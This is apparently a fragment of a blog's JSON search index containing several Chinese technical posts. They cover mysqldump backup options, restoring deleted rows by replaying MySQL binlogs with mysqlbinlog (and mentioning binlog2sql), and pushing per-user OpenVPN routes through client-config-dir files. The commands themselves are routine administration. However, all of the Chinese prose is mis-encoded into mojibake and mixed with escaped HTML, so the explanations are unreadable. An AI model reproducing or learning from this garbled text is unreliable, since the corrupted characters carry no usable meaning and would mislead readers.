--flush-logs --master-data=2 -B åº“å  \u0026gt; åº“å.sql\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç”±äºæˆ‘ä»¬åœ¨å¤‡ä»½ä¸­ä½¿ç”¨äº†å‚æ•°\u0026ndash;flush-logs \u0026ndash;master-data=2ï¼Œæ‰€ä»¥ \u003cstrong\u003eåº“å.sql\u003c/strong\u003e ä¸­ä¼šæœ‰binglogçš„ä¿¡æ¯ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚\u003c/p\u003e\n\u003ch4 id=\"ä¸€ç”¨mysqlbinlogæ¥æ¢å¤\"\u003eä¸€ã€ç”¨mysqlbinlogæ¥æ¢å¤\u003c/h4\u003e\n\u003cp\u003eæˆ‘ä»¬é¦–å…ˆè¦æŸ¥åˆ°éšåçš„binlogæ–‡ä»¶æ˜¯é‚£ä¸ªï¼Œä»é‚£æ—¶å€™èµ·åˆç”Ÿæˆå¤šå°‘ä¸ªbinglogæ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åå»åº“é‡ŒæŸ¥è¯¢ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow master logs\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow master status\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20221122194020751\" loading=\"lazy\" src=\"/posts/20221122-mysqldump_binlog/image-20221122194020751.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è¦åˆ†æä¸€ä¸‹SQL\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# show binlog events [IN \u0026#39;log_name\u0026#39;] [FROM pos] [LIMIT [offset,] row_count];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow binlog events in \u003cspan class=\"s1\"\u003e\u0026#39;javaboy_logbin.000002\u0026#39;\u003c/span\u003e limit 5,10\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬æ¥ç¿»çœ‹æ—¥å¿—ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20221122194528219\" loading=\"lazy\" src=\"/posts/20221122-mysqldump_binlog/image-20221122194528219.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¯ä»¥çœ‹åˆ°æ˜¯ä» 764\u0026ndash;\u0026gt;865 ï¼Œå‘ç”Ÿäº†åˆ é™¤ï¼Œé‚£ä¹ˆå›æ”¾åˆ°è¿™ä¸ª764è¿™ä¸ªpositionå‰å³å¯ï¼Œ764ä¸ä¼šæ‰§è¡Œ\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emysqlbinlog /var/lib/mysql/mysql-bin.000204 --stop-position=764 --database=bbb | mysql -uroot -p\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u0026ndash;start-positionæŒ‡å®šä»å“ªé‡Œå¼€å§‹æ¢å¤ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œå°±ä¼šä»binlogæ–‡ä»¶å¼€å¤´çš„positionå¼€å§‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqlbinlog /var/lib/mysql/mysql-bin.000204 --start-position\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e205\u003c/span\u003e --stop-position\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e764\u003c/span\u003e --database\u003cspan class=\"o\"\u003e=\u003c/span\u003ebbb \u003cspan class=\"p\"\u003e|\u003c/span\u003e mysql -uroot -p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒç”¨binglog2sqlæ¥æ¢å¤\"\u003eäºŒã€ç”¨binglog2sqlæ¥æ¢å¤\u003c/h4\u003e\n\u003cp\u003ebinlog2sql æ˜¯å¤§ä¼—ç‚¹è¯„å…¬å¸çš„DBA å¼€å‘çš„ä¸€æ¬¾åŸºäºé€šè¿‡è§£æbinlogå°†delete æ¢å¤ä¸ºinsert,update çš„å€¼ set å­—æ®µå’Œwhereæ¡ä»¶åšå¯¹è°ƒçš„åŸç†æ¥æ¢å¤æ•°æ®çš„ã€‚ ä½¿ç”¨é™åˆ¶ MySQLçš„binlog format å¿…é¡»æ˜¯row å®‰è£…\u003c/p\u003e","title":"MySQLæ•°æ®åº“çš„å¤‡ä»½å’Œæ¢å¤ä¹‹äºŒ"},{"content":"å–œå¤§æ™®å¥”ï¼Œå¹²äº†ä¸€ä¸ªæœˆçš„MySQL DBAçš„å·¥ä½œï¼Œåˆå­¦åˆ°äº†ä¸€éƒ¨åˆ†çŸ¥è¯†ã€‚\nè®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡ä¸æ—¶åªéœ€\nmysqldump çš„å¤‡ä»½å…¶å®å¾ˆéº»çƒ¦ï¼Œè¦è€ƒè™‘å¾ˆå¤šå› ç´ \nå¤‡ä»½æ—¶å€™ä¸èƒ½é”è¡¨ æ¢å¤çš„æ—¶å€™è¦å¿« æœ‰äºŒè¿›åˆ¶æ•°æ®çš„è¯éœ€è¦å¤‡ä»½äºŒè¿›åˆ¶æ•°æ® æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½ é€šå¸¸ mysqldump æ˜¯åšæ¯å¤©çš„fullbackupï¼Œè¦ä¸ºä¹‹åçš„ binlog åšå¥½å‡†å¤‡ï¼Œä¸‡ä¸€è¦æ¢å¤è¦æå‰åšå¥½å‡†å¤‡ æˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥è¯´ï¼š\nä¸€ã€å¤‡ä»½æ—¶ä¸èƒ½é”è¡¨\n--single-transaction é€šè¿‡å°†å¯¼å‡ºæ“ä½œå°è£…åœ¨ä¸€ä¸ªäº‹åŠ¡å†…æ¥ä½¿å¾—å¯¼å‡ºçš„æ•°æ®æ˜¯ä¸€ä¸ªä¸€è‡´æ€§å¿«ç…§ è¯¥é€‰é¡¹åœ¨å¯¼å‡ºæ•°æ®ä¹‹å‰æäº¤ä¸€ä¸ªBEGIN SQLè¯­å¥ï¼ŒBEGINä¸ä¼šé˜»å¡ä»»ä½•åº”ç”¨ç¨‹åºä¸”èƒ½ä¿è¯å¯¼å‡ºæ—¶æ•°æ®åº“çš„ä¸€è‡´æ€§çŠ¶æ€ã€‚ å®ƒåªé€‚ç”¨äºInnoDBå­˜å‚¨å¼•æ“ã€‚ æœ¬é€‰é¡¹å’Œ--lock-tablesé€‰é¡¹æ˜¯äº’æ–¥çš„ï¼Œå› ä¸ºLOCK TABLESä¼šä½¿ä»»ä½•æŒ‚èµ·çš„äº‹åŠ¡éšå«æäº¤ã€‚ äºŒã€æ¢å¤æ—¶è¦å°½é‡å¿«\n--opt ç­‰åŒäº--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys è¯¥é€‰é¡¹é»˜è®¤å¼€å¯, å¯ä»¥ç”¨--skip-optç¦ç”¨. --extended-insert, -e --extended-insert=false ä½¿ç”¨å…·æœ‰å¤šä¸ªVALUESåˆ—çš„INSERTè¯­æ³•ã€‚è¿™æ ·ä½¿å¯¼å‡ºæ–‡ä»¶æ›´å°ï¼Œå¹¶åŠ é€Ÿå¯¼å…¥æ—¶çš„é€Ÿåº¦ã€‚ é»˜è®¤ä¸ºæ‰“å¼€çŠ¶æ€ï¼Œä½¿ç”¨--skip-extended-insertå–æ¶ˆé€‰é¡¹ã€‚ ä¸‰ã€æœ‰äºŒè¿›åˆ¶çš„æŒ‰äºŒè¿›åˆ¶å¤‡ä»½\n--hex-blob ä½¿ç”¨åå…­è¿›åˆ¶æ ¼å¼å¯¼å‡ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²å­—æ®µã€‚å¦‚æœæœ‰äºŒè¿›åˆ¶æ•°æ®å°±å¿…é¡»ä½¿ç”¨è¯¥é€‰é¡¹ã€‚å½±å“åˆ°çš„å­—æ®µç±»å‹æœ‰BINARYã€VARBINARYã€BLOBã€‚ å››ã€æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½\n--triggers å¯¼å‡ºè§¦å‘å™¨ã€‚è¯¥é€‰é¡¹é»˜è®¤å¯ç”¨ï¼Œç”¨--skip-triggersç¦ç”¨å®ƒã€‚ --routines, -R å¯¼å‡ºå­˜å‚¨è¿‡ç¨‹ä»¥åŠè‡ªå®šä¹‰å‡½æ•° äº”ã€ä¸ºä¹‹åå¦‚æœè¦åšbinlogæ¢å¤æå‰åšå¥½å‡†å¤‡\n--flush-logs å¼€å§‹å¯¼å‡ºä¹‹å‰åˆ·æ–°binlogæ—¥å¿—ã€‚ è¯·æ³¨æ„ï¼šå‡å¦‚ä¸€æ¬¡å¯¼å‡ºå¤šä¸ªæ•°æ®åº“(ä½¿ç”¨é€‰é¡¹--databasesæˆ–è€…--all-databases)ï¼Œå°†ä¼šé€ä¸ªæ•°æ®åº“åˆ·æ–°æ—¥å¿—ã€‚ é™¤éä½¿ç”¨--lock-all-tablesæˆ–è€…--master-dataå¤–ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ—¥å¿—å°†ä¼šè¢«åˆ·æ–°ä¸€æ¬¡ï¼Œç›¸åº”çš„æ‰€ä»¥è¡¨åŒæ—¶è¢«é”å®šã€‚ å› æ­¤ï¼Œå¦‚æœæ‰“ç®—åŒæ—¶å¯¼å‡ºå’Œåˆ·æ–°æ—¥å¿—åº”è¯¥ä½¿ç”¨--lock-all-tables æˆ–è€…--master-data å’Œ--flush-logs --master-data åœ¨å¯¼å‡ºçš„æ—¶å€™åŒæ—¶ç”Ÿæˆbinlogæ–‡ä»¶åå’Œä½ç½®åœ¨å¯¼å‡ºçš„æ–‡ä»¶å¼€å¤´ã€‚ è¿™ä¸ªéå¸¸é‡è¦ã€‚binlog çš„æ–‡ä»¶å’Œä½ç½®å¯ä»¥ä»è¿™é‡Œæ‹¿åˆ°ã€‚ ä¾‹å¦‚ï¼š -- CHANGE MASTER TO MASTER_LOG_FILE=\u0026#39;binlog.000001\u0026#39;, MASTER_LOG_POS=157; è¯¥é€‰é¡¹å°†binlogçš„ä½ç½®å’Œæ–‡ä»¶åè¿½åŠ åˆ°è¾“å‡ºæ–‡ä»¶ä¸­ã€‚ å¦‚æœä¸º1ï¼Œå°†ä¼šè¾“å‡ºCHANGE MASTER å‘½ä»¤ï¼› å¦‚æœä¸º2ï¼Œè¾“å‡ºçš„CHANGE MASTERå‘½ä»¤å‰æ·»åŠ æ³¨é‡Šä¿¡æ¯ã€‚ è¯¥é€‰é¡¹å°†æ‰“å¼€--lock-all-tables é€‰é¡¹ï¼Œé™¤é--single-transactionä¹Ÿè¢«æŒ‡å®šï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…¨å±€è¯»é”åœ¨å¼€å§‹å¯¼å‡ºæ—¶è·å¾—å¾ˆçŸ­çš„æ—¶é—´ï¼›å…¶ä»–å†…å®¹å‚è€ƒä¸‹é¢çš„--single-transactioné€‰é¡¹ï¼‰ã€‚ è¯¥é€‰é¡¹è‡ªåŠ¨å…³é—­--lock-tablesé€‰é¡¹ã€‚ mysqldump -uroot -p --host=localhost --all-databases --master-data=1; mysqldump -uroot -p --host=localhost --all-databases --master-data=2; é‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œæ€»ç»“ä¸€è¡Œéå¸¸ä½¿ç”¨çš„å¤‡ä»½è¯­å¥ï¼š\nmysqldump -uroot -p -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 -B åº“å \u0026gt; åº“å.sql ","permalink":"https://rendoumi.com/posts/20221121-mysqldump/","summary":"\u003cp\u003eå–œå¤§æ™®å¥”ï¼Œå¹²äº†ä¸€ä¸ªæœˆçš„MySQL DBAçš„å·¥ä½œï¼Œåˆå­¦åˆ°äº†ä¸€éƒ¨åˆ†çŸ¥è¯†ã€‚\u003c/p\u003e\n\u003cp\u003eè®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡ä¸æ—¶åªéœ€\u003c/p\u003e\n\u003cp\u003emysqldump çš„å¤‡ä»½å…¶å®å¾ˆéº»çƒ¦ï¼Œè¦è€ƒè™‘å¾ˆå¤šå› ç´ \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eå¤‡ä»½æ—¶å€™ä¸èƒ½é”è¡¨\u003c/li\u003e\n\u003cli\u003eæ¢å¤çš„æ—¶å€™è¦å¿«\u003c/li\u003e\n\u003cli\u003eæœ‰äºŒè¿›åˆ¶æ•°æ®çš„è¯éœ€è¦å¤‡ä»½äºŒè¿›åˆ¶æ•°æ®\u003c/li\u003e\n\u003cli\u003eæœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½\u003c/li\u003e\n\u003cli\u003eé€šå¸¸ mysqldump æ˜¯åšæ¯å¤©çš„fullbackupï¼Œè¦ä¸ºä¹‹åçš„ binlog åšå¥½å‡†å¤‡ï¼Œä¸‡ä¸€è¦æ¢å¤è¦æå‰åšå¥½å‡†å¤‡\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥è¯´ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€å¤‡ä»½æ—¶ä¸èƒ½é”è¡¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--single-transaction\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eé€šè¿‡å°†å¯¼å‡ºæ“ä½œå°è£…åœ¨ä¸€ä¸ªäº‹åŠ¡å†…æ¥ä½¿å¾—å¯¼å‡ºçš„æ•°æ®æ˜¯ä¸€ä¸ªä¸€è‡´æ€§å¿«ç…§\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¯¥é€‰é¡¹åœ¨å¯¼å‡ºæ•°æ®ä¹‹å‰æäº¤ä¸€ä¸ªBEGIN SQLè¯­å¥ï¼ŒBEGINä¸ä¼šé˜»å¡ä»»ä½•åº”ç”¨ç¨‹åºä¸”èƒ½ä¿è¯å¯¼å‡ºæ—¶æ•°æ®åº“çš„ä¸€è‡´æ€§çŠ¶æ€ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå®ƒåªé€‚ç”¨äºInnoDBå­˜å‚¨å¼•æ“ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæœ¬é€‰é¡¹å’Œ--lock-tablesé€‰é¡¹æ˜¯äº’æ–¥çš„ï¼Œå› ä¸ºLOCK TABLESä¼šä½¿ä»»ä½•æŒ‚èµ·çš„äº‹åŠ¡éšå«æäº¤ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€æ¢å¤æ—¶è¦å°½é‡å¿«\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--opt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç­‰åŒäº--add-drop-table,  --add-locks, --create-options, --quick, --extended-insert, --lock-tables,  --set-charset, --disable-keys è¯¥é€‰é¡¹é»˜è®¤å¼€å¯,  å¯ä»¥ç”¨--skip-optç¦ç”¨.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--extended-insert,  -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--extended-insert\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eä½¿ç”¨å…·æœ‰å¤šä¸ªVALUESåˆ—çš„INSERTè¯­æ³•ã€‚è¿™æ ·ä½¿å¯¼å‡ºæ–‡ä»¶æ›´å°ï¼Œå¹¶åŠ é€Ÿå¯¼å…¥æ—¶çš„é€Ÿåº¦ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eé»˜è®¤ä¸ºæ‰“å¼€çŠ¶æ€ï¼Œä½¿ç”¨--skip-extended-insertå–æ¶ˆé€‰é¡¹ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€æœ‰äºŒè¿›åˆ¶çš„æŒ‰äºŒè¿›åˆ¶å¤‡ä»½\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--hex-blob\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eä½¿ç”¨åå…­è¿›åˆ¶æ ¼å¼å¯¼å‡ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²å­—æ®µã€‚å¦‚æœæœ‰äºŒè¿›åˆ¶æ•°æ®å°±å¿…é¡»ä½¿ç”¨è¯¥é€‰é¡¹ã€‚å½±å“åˆ°çš„å­—æ®µç±»å‹æœ‰BINARYã€VARBINARYã€BLOBã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå››ã€æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--triggers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¯¼å‡ºè§¦å‘å™¨ã€‚è¯¥é€‰é¡¹é»˜è®¤å¯ç”¨ï¼Œç”¨--skip-triggersç¦ç”¨å®ƒã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--routines, -R\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¯¼å‡ºå­˜å‚¨è¿‡ç¨‹ä»¥åŠè‡ªå®šä¹‰å‡½æ•°\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäº”ã€ä¸ºä¹‹åå¦‚æœè¦åšbinlogæ¢å¤æå‰åšå¥½å‡†å¤‡\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--flush-logs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¼€å§‹å¯¼å‡ºä¹‹å‰åˆ·æ–°binlogæ—¥å¿—ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¯·æ³¨æ„ï¼šå‡å¦‚ä¸€æ¬¡å¯¼å‡ºå¤šä¸ªæ•°æ®åº“\u003cspan class=\"o\"\u003e(\u003c/span\u003eä½¿ç”¨é€‰é¡¹--databasesæˆ–è€…--all-databases\u003cspan class=\"o\"\u003e)\u003c/span\u003eï¼Œå°†ä¼šé€ä¸ªæ•°æ®åº“åˆ·æ–°æ—¥å¿—ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eé™¤éä½¿ç”¨--lock-all-tablesæˆ–è€…--master-dataå¤–ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ—¥å¿—å°†ä¼šè¢«åˆ·æ–°ä¸€æ¬¡ï¼Œç›¸åº”çš„æ‰€ä»¥è¡¨åŒæ—¶è¢«é”å®šã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå› æ­¤ï¼Œå¦‚æœæ‰“ç®—åŒæ—¶å¯¼å‡ºå’Œåˆ·æ–°æ—¥å¿—åº”è¯¥ä½¿ç”¨--lock-all-tables æˆ–è€…--master-data å’Œ--flush-logs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--master-data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eåœ¨å¯¼å‡ºçš„æ—¶å€™åŒæ—¶ç”Ÿæˆbinlogæ–‡ä»¶åå’Œä½ç½®åœ¨å¯¼å‡ºçš„æ–‡ä»¶å¼€å¤´ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¿™ä¸ªéå¸¸é‡è¦ã€‚binlog çš„æ–‡ä»¶å’Œä½ç½®å¯ä»¥ä»è¿™é‡Œæ‹¿åˆ°ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eä¾‹å¦‚ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- CHANGE MASTER TO \u003cspan class=\"nv\"\u003eMASTER_LOG_FILE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;binlog.000001\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eMASTER_LOG_POS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e157\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¯¥é€‰é¡¹å°†binlogçš„ä½ç½®å’Œæ–‡ä»¶åè¿½åŠ åˆ°è¾“å‡ºæ–‡ä»¶ä¸­ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¦‚æœä¸º1ï¼Œå°†ä¼šè¾“å‡ºCHANGE MASTER å‘½ä»¤ï¼›\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¦‚æœä¸º2ï¼Œè¾“å‡ºçš„CHANGE  MASTERå‘½ä»¤å‰æ·»åŠ æ³¨é‡Šä¿¡æ¯ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¯¥é€‰é¡¹å°†æ‰“å¼€--lock-all-tables é€‰é¡¹ï¼Œé™¤é--single-transactionä¹Ÿè¢«æŒ‡å®šï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…¨å±€è¯»é”åœ¨å¼€å§‹å¯¼å‡ºæ—¶è·å¾—å¾ˆçŸ­çš„æ—¶é—´ï¼›å…¶ä»–å†…å®¹å‚è€ƒä¸‹é¢çš„--single-transactioné€‰é¡¹ï¼‰ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¯¥é€‰é¡¹è‡ªåŠ¨å…³é—­--lock-tablesé€‰é¡¹ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqldump  -uroot -p --host\u003cspan class=\"o\"\u003e=\u003c/span\u003elocalhost --all-databases --master-data\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqldump  -uroot -p --host\u003cspan class=\"o\"\u003e=\u003c/span\u003elocalhost --all-databases --master-data\u003cspan class=\"o\"\u003e=\u003c/span\u003e2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œæ€»ç»“ä¸€è¡Œéå¸¸ä½¿ç”¨çš„å¤‡ä»½è¯­å¥ï¼š\u003c/p\u003e","title":"MySQLæ•°æ®åº“çš„å¤‡ä»½å’Œæ¢å¤ä¹‹ä¸€"},{"content":"å…¬å¸ç”¨çš„ OpenVPN ï¼Œç ”å‘éƒ¨é—¨å’Œæ™®é€šå‘˜å·¥çš„æƒé™ä¸ä¸€æ ·ï¼ŒæŠ€æœ¯éƒ¨é—¨éœ€è¦è®¿é—®æœåŠ¡å™¨ï¼Œæ™®é€šå‘˜å·¥åˆ™ä¸éœ€è¦\nè¿™æ ·çš„è¯å°±éœ€è¦æ ¹æ®ç”¨æˆ·å®šåˆ¶è·¯ç”±äº†ï¼ŒæŠ€æœ¯éƒ¨é—¨æ¨é€ç‰¹å®šçš„è·¯ç”±ï¼Œæ™®é€šå‘˜å·¥ä¸æ¨é€ã€‚\né‚£ä¹ˆåšæ³•å¦‚ä¸‹ï¼Œåœ¨ server.conf åšå¦‚ä¸‹è®¾å®šï¼š\nifconfig-pool-persist /etc/openvpn/conf/ipp.txt client-config-dir /etc/openvpn/conf/static ç¬¬ä¸€è¡Œæ˜¯æŒ‡å®šè®°å½• ip åœ°å€çš„æ–‡ä»¶ï¼Œä½œç”¨æ˜¯å¦‚æœæœåŠ¡å™¨è¿›ç¨‹é‡å¯äº†ï¼Œé‡å¯åä¼šè¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå®¢æˆ·ç«¯é‡æ–°æ‹¨å·åè·å¾—çš„ IP å°±ä¸ä¼šå˜ï¼Œè¿˜æ˜¯é‡å¯å‰çš„ IPã€‚\nç¬¬äºŒè¡Œæ˜¯æŒ‡å®šäº†å®¢æˆ·ç«¯çš„å•ç‹¬é…ç½®\næˆ‘ä»¬å‡è®¾ä¸€ä¸ªç”¨æˆ·æ˜¯ zhangranruiï¼Œé‚£ä¹ˆå°±å» /etc/openvpn/conf/static ä¸‹å»ºç«‹ä¸€ä¸ª zhangranrui çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n# å‰é¢æ˜¯å®¢æˆ·ç«¯å›ºå®šIPåœ°å€ï¼Œåé¢æ˜¯ç½‘å…³åœ°å€\rifconfig-push 172.18.0.10 172.18.0.9\r# æ¨é€è·¯ç”±ï¼Œåé¢æ˜¯æ©ç \rpush \u0026#34;route 10.10.0.0 255.255.0.0\u0026#34;\r# é‡å®šå‘å®¢æˆ·ç«¯çš„æ‰€æœ‰æµé‡ï¼Œå¦åˆ™è®¿é—®æœåŠ¡ç«¯å†…ç½‘è¦åƒä¸Šé¢ä¸€æ ·æ¨é€è·¯ç”±\r# push \u0026#34;redirect-gateway def1\u0026#34;\r# æ¨é€ç»™å®¢æˆ·ç«¯çš„DNSè§£æåœ°å€\r# push \u0026#34;dhcp-option DNS 223.5.5.5\u0026#34;\r# push \u0026#34;dhcp-option DNS 114.114.114.114\u0026#34; 